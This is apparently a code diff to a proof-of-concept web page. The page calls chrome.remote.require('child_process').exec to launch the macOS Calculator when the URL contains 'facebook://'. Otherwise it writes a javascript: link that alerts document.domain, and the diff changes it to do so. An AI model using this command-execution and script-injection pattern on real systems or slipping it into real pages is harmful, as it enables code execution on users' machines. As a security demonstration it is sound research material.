@@ -3,9 +3,8 @@
         if (window.location.href.includes('facebook://')) {
             chrome.remote.require('child_process').exec('/Applications/Calculator.app/Contents/MacOS/Calculator')
         } else {
-            var test = window.history.previous.href;
             document.write(
-                `<a target="blank" href="javascript:alert(test);">Check</a>`
+                `<a target="blank" href="javascript:alert(document.domain);">Check</a>`
             )
         }
     </script>
